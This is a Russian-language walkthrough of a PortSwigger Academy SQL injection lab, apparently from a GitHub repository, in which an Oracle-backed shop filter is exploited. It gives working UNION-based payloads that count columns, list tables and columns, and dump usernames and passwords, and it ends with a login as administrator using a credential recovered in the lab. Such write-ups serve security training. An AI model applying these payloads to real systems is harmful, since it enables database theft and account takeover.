Откроем предложенный уявзимый ресурс, зайдем на страницу с подарками, и найдем данный запрос в `Proxy` -> `HTTP history` и отправим данный запрос в `Repeater`
```
GET /filter?category=Gifts
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/1.png)
Проверим, что SQL-инъекция действительно возможна, добавив `'--`, и уберем значение категории фильтра, чтобы не видеть ненужную информацию
```
GET /filter?category='--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/2.png)
Учитывая, что мы эксплуатируем Oracle DB, воспользуемся встроенной таблицей `dual` для конструкции `UNION SELECT...`
Пользуясь конструкцией `UNION SELECT NULL,...,NULL from dual` найдем количество столбцов в возвращемой таблице. В нашем случае - их две
```
GET /filter?category='UNION+SELECT+NULL,NULL+FROM+dual--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/3.png)
Узнаем все имеющие таблицы в данной бд
```
GET /filter?category='UNION+SELECT+table_name,NULL+FROM+all_tables--
```
среди списка видим странную таблицу `USERS_JUXSCC`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/4.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/5.png)
Смотрим список ее столблцов 
```
GET /filter?category='UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_JUXSCC'--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/6.png)
Видим 2 таблицы, узнаем что внутри каждой из них
`PASSWORD_EONUAO`
`USERNAME_ZGPZEG`
```
GET /filter?category='UNION+SELECT+USERNAME_ZGPZEG,+PASSWORD_EONUAO+FROM+USERS_JUXSCC--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/7.png)
Залогинимся под `administrator:uiarv4vewvj8rlklmkbj` и получаем уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/18.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/pics%20for%20walktrough/8.png)
